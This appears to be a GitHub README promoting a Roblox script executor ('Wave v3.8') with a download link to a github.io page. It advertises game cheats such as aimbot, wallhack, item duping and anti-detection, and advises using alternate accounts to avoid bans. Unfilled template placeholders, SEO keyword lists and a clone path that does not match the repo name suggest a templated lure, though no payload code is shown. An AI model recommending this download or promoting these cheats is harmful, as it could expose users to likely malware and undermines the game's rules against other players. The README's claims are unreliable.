# Wave PC v3.8 - Roblox Script Executor for 2026

> **A dependable Roblox script executor for Windows.** Wave v3.8 provides low-latency Lua injection, an integrated hub containing more than 500 scripts, and a lightweight desktop client updated for 2026.

[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-blue?style=flat-square&logo=windows)](https://github.com)
[![Roblox](https://img.shields.io/badge/Compatible-Roblox%202026-red?style=flat-square)](https://github.com)
[![Scripts](https://img.shields.io/badge/Scripts-500%2B-green?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-MIT-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/andrew-coleje2475/wave-script-hub-v38?style=flat-square)](https://github.com)

---

<p align="center">
  <a href="https://andrew-coleje2475.github.io/wave-script-hub-v38/">
    <img src="https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20{EXEC_URL}-v3.8%20Latest-brightgreen?style=for-the-badge" alt="Download Wave">
  </a>
</p>

> **[⬇️ Download Wave v3.8](https://andrew-coleje2475.github.io/wave-script-hub-v38/)**
> Windows 10 / 11 · 64-bit · Free · No Key Required

---

## Overview

**Wave** is a Windows desktop platform for executing Roblox scripts. Rather than relying on a browser, it operates natively on Windows 10 and Windows 11 for reduced injection latency, wider script compatibility, and a queue that remains available across game restarts.

Use it for Blox Fruits farming, Adopt Me pet automation, Pet Simulator X tasks, or other custom Lua workflows. Wave is designed to execute these scripts without crashes or detection-related lag.

---

## Highlights

- **Instant injection** - paste Lua, choose execute, and start the script
- **Integrated Script Hub** - browse more than 500 curated scripts for popular Roblox experiences
- **Session-persistent queue** - retain queued scripts between launches using local SQLite storage
- **Automatic updates** - compatibility patches arrive within hours of Roblox client releases
- **Localized interface** - available in English, Russian, Portuguese, Japanese, and Vietnamese
- **Small installation footprint** - less than 40 MB installed with no background services
- **Batch execution** - arrange multiple scripts to run in sequence
- **Lua debugging tools** - receive error details at the individual line level

---

## Game and Script Coverage

| Game | Script Category | Status |
|------|-----------------|--------|
| Blox Fruits | Auto farm, fruit finder, sea travel | ✅ Active |
| Adopt Me | Pet spawner, auto collect, dupe | ✅ Active |
| Pet Simulator X | Egg farm, rebirth, auto collect | ✅ Active |
| Brookhaven | ESP, speed, fly | ✅ Active |
| Arsenal | Aimbot, wallhack, ESP | ✅ Active |
| Murder Mystery 2 | Coin farm, knife grab | ✅ Active |

---

## Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| OS | Windows 10 (64-bit) | Windows 11 |
| RAM | 4 GB | 8 GB |
| Storage | 100 MB | 500 MB |
| .NET | 4.8 | 6.0+ |
| Roblox | Latest | Latest |

> Wave does not support Linux or macOS. Windows Server 2022 is only partially compatible.

---

## Start Using Wave

### Launch from the Command Line

```bash
# Clone the repository
git clone https://github.com/andrew-coleje2475/wave-script-hub-v38.git
cd Wave-Exec-v3.8

# Run the executor
WaveExecutor.exe --profile default --queue async
```

### Execution Profile

```yaml
profile: default
execution:
  mode: async
  timeout: 30s
  retries: 3
queue:
  persistence: sqlite
  max_size: 128
logging:
  level: info
  output: ./logs/{exec_lower}.log
```

### Available Arguments

```
WaveExecutor.exe [options]

  --profile <name>     Load a saved execution profile
  --queue <mode>       Queue mode: sync | async | batch
  --script <path>      Path to a .lua script file on startup
  --verbose            Enable verbose logging
  --no-update          Skip the auto-update check
```

---

## Script Hub Searches for 2026

The built-in Wave hub organizes frequently searched Roblox scripts and related resources, including:

- **blox fruits script 2026** - auto farm, boss killer, fruit sniper
- **adopt me script spawn pets** - instant pet spawner, auto hatch
- **pet simulator x script** - rebirth automation, egg farm
- **wave executor download** - official build, no third-party mirrors
- **wave no key 2026** - updated bypass for the latest Roblox patch
- **roblox scripting tutorials** - Lua material ranging from beginner to advanced

---

## Project Structure

```
Wave
├── Core/
│   ├── InjectionEngine.cs     # Low-level Roblox process injection
│   ├── LuaRuntime.cs          # Luau 5.1 compatible interpreter
│   └── QueueManager.cs        # SQLite-backed persistent queue
├── Hub/
│   ├── ScriptIndex.json       # 500+ indexed scripts with metadata
│   └── AutoUpdater.cs         # GitHub-release update system
├── UI/
│   ├── MainWindow.xaml        # WPF desktop interface
│   └── Themes/                # Light / Dark / System themes
└── Profiles/
    └── default.yaml           # Default execution profile
```

---

## Frequently Asked Questions

**Is Wave safe to use?**  
Wave is intended for personal Roblox automation and educational use. Each user is responsible for following Roblox's Terms of Service.

**Will Wave continue working after Roblox updates?**  
The automatic update system delivers compatibility patches within hours of each Roblox client release.

**What sets Wave apart from other executors?**  
Wave v3.8 works fully offline, uses less than 40 MB of RAM while idle, and includes a larger bundled script collection than most alternatives.

**Could script execution result in an account ban?**  
Use alternate accounts when running scripts. Wave provides stealth features, but no executor can guarantee complete undetectability.

**Where does Wave save my scripts?**  
Saved scripts are kept locally in `%AppData%\Wave\scripts\`. They are not sent to external servers.

---

## Planned for 2026

- [ ] Android companion application for remote queue management
- [ ] Community script marketplace with ratings
- [ ] Anti-detection layer v3 using memory layout randomization
- [ ] Browser extension for importing scripts with one click
- [ ] Experimental macOS build

---

## License

Wave is released under the MIT License. See [LICENSE](LICENSE) for the full terms.

---

<p align="center">
  <i>Precision execution, zero compromise. Wave v3.8 - built for 2026.</i>
</p>
